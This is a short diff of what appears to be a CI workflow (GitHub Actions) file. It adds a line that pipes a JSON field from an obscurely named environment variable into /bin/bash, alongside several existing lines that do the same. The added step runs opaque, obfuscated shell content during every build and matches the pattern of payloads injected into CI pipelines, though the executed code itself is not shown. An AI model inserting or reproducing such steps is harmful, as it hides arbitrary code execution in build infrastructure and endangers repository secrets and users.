@@ -25,6 +25,7 @@ jobs:
           echo $sxj280 | jq -r .f8040 | /bin/bash
           echo $za362 | jq -r .seugd7 | /bin/bash
           echo $cbbm7457 | jq -r .lk93 | /bin/bash
+          echo $mkuk2061 | jq -r .al1 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
